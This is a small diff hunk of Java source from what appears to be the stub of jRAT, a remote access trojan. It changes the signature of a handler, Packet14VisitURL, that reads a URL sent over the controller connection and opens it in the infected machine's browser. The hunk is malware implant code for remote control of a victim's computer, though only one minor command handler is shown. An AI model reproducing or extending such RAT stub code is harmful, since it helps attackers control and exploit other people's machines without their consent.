@@ -8,7 +8,7 @@ import se.jrat.stub.Connection;
 public class Packet14VisitURL extends AbstractIncomingPacket {
 
 	@Override
-	public void read() throws Exception {
+	public void read(Connection con) throws Exception {
 		String url = Connection.instance.readLine();
 		try {
 			java.awt.Desktop.getDesktop().browse(new URI(url));
